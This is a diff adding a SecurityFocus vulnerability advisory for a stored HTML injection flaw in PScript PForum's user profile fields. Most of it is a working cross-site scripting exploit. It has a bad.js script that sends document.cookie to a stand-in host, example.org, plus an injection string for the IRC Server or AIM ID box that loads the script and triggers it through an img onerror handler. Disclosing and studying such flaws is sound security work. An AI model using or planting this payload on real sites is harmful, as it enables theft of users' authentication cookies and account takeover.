@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/10954/info
+
+PScript PForum is reported prone to a HTML injection vulnerability. The vulnerability presents itself due to a lack of sufficient sanitization performed on data submitted through input fields of the PForum user profile form.
+
+This could be exploited to steal cookie-based authentication credentials. It is also possible to use this type of vulnerability as an attack vector to exploit latent browser security flaws.
+
+Create a Javascript file and save it as bad.js (your domain name is in this
+case example.com). The file contains the following code:
+
+// bad.js
+function b()
+{
+location.href='example.org/compute_stolen_data.ext?'+document.cookie;
+}
+
+Edit your profile and enter the following line into the IRC Server or AIM
+ID Input Box. The string have to be shorter then 100 characters.
+
+// Input Box (without line break)
+"><script src=http://example.com/bad.js></script>
+<img height=0 width=0 src=foo onerror=b(); >
